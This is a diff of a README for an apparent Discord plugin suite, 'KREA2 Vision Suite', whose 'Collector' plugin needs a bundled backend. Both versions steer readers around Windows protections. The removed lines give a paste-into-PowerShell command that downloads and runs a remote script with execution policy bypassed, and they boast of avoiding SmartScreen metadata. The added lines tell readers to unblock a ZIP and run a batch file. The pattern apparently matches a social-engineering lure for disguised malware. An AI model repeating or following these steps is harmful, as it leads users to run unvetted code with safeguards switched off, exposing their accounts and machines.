@@ -25,15 +25,11 @@ https://docs.betterdiscord.app/users/getting-started/faq
 
 ## 2. Install KREA2 Vision Suite
 
-Recommended installation: open Windows PowerShell, paste this command, and press Enter:
+Download the complete Windows ZIP below. Do not download only the `Krea2DiscordCollector.plugin.js` file: the plugin requires the included local Vision backend and model runtime.
 
-`$p="$env:TEMP\Install-KREA2VisionSuite.ps1"; Invoke-WebRequest "https://raw.githubusercontent.com/pixelgraple/KREA2-Vision-Suite/main/Install-KREA2VisionSuite.ps1" -OutFile $p; powershell -NoProfile -ExecutionPolicy Bypass -File $p`
+Before extracting it, right-click the ZIP, select **Properties**, enable **Unblock**, and select **Apply**. Then extract it and double-click `START HERE - INSTALL.bat`.
 
-The bootstrap downloads the complete stable release, verifies its exact byte length and SHA-256, and starts setup without propagating browser SmartScreen metadata. Do not download only the `Krea2DiscordCollector.plugin.js` file. The plugin requires the included local Vision backend and model runtime.
-
-Manual alternative: download the complete ZIP below. Before extracting it, right-click the ZIP, select **Properties**, enable **Unblock**, and select **Apply**. Then extract it and double-click `START HERE - INSTALL.bat`.
-
-https://raw.githubusercontent.com/pixelgraple/KREA2-Vision-Suite/main/releases/Krea2VisionSuite-v0.13.18-win64.zip
+https://github.com/pixelgraple/KREA2-Vision-Suite/raw/main/releases/Krea2VisionSuite-v0.13.21-win64.zip
 
 The installer will:
 
